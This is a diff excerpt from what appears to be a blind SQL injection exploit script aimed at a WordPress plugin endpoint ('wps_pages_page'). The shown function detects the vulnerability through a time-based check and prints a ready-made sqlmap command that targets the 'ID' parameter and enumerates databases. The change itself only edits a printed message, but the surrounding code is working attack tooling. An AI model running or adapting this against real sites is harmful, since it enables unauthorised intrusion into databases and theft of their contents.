@@ -18,7 +18,7 @@ def blindsql(url):
 		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10 --dbs'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
 		return True
 	except (requests.ConnectTimeout, requests.exceptions.ReadTimeout):
-		print('(+) WwoowowoW maybe vuln ;)')
+		print('(+) WwoowowoW goood news ;)')
 		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10 --dbs'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
 		return True
 def exploit(url):
